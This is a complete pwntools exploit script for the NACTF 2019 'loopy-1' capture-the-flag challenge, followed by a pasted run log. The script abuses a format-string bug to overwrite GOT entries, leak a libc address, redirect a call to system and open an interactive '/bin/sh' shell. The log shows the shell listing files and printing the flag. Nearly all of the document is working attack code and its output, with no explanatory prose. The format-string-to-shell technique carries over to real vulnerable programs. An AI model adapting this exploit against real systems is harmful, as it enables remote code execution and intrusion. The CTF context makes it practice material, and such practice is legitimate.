from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31732)
printf_offset = 0x00052cb0
system_offset = 0x0003ec00

con.recvregex('Type something>')

payload = pack(0x804c014)  # __stack_chk_fail@got
payload += pack(0x804c00c)  # print@got
'''
0x804c014: 0x08049056 => 0x08049213
'''
s = (0x10000 + 0x9213 - len(payload)) % 0x10000
payload += "%%%dc%%%d$hn" % (s, 7)
payload += '%8$s'
payload += 'A' * 64
con.sendline(payload)

msg = con.recvregex('A' * 64).strip()
libc_base_addr = unpack(msg[-88:-84]) - printf_offset
print "[+] libc_base_addr = 0x%x" % libc_base_addr
system_addr = libc_base_addr + system_offset
print "[+] system_addr = 0x%x" % system_addr

con.recvregex('Type something>')

payload = pack(0x804c00c)  # gets@got
payload += pack(0x804c00c + 0x02)  # gets@got
'''
0x804c010: ???????? => system
'''
s1 = (0x10000 + (system_addr & 0x0000ffff) - len(payload)) % 0x10000
s2 = (0x10000 + (system_addr >> 16) - (system_addr & 0x0000ffff)) % 0x10000
payload += "%%%dc%%%d$hn" % (s1, 7)
payload += "%%%dc%%%d$hn" % (s2, 8)
payload += 'A' * 64
con.sendline(payload)

con.recvregex('Type something>')
con.sendline('/bin/sh')
con.recvregex('You typed: ')
con.interactive()

'''
$ python loopy-1.py
[+] Opening connection to shell.2019.nactf.com on port 31732: Done
[+] libc_base_addr = 0xf7d08000
[+] system_addr = 0xf7d46c00
[*] Switching to interactive mode
$ ls
flag.txt
loopy-1
$ cat flag.txt
nactf{lo0p_4r0und_th3_G0T_VASfJ4VJ}
'''
